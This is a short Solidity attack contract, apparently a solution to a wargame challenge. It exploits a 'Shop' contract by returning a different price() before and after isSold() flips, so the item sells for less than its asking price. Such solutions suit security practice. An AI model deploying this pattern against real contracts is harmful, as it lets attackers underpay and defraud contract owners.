pragma solidity ^0.8.0;

interface Shop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract AttackToggle {
    Shop immutable shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function price() external view returns (uint) {
        return shop.isSold() ? 100 : 101;
    }

    function attack() public {
        shop.buy();
    }
}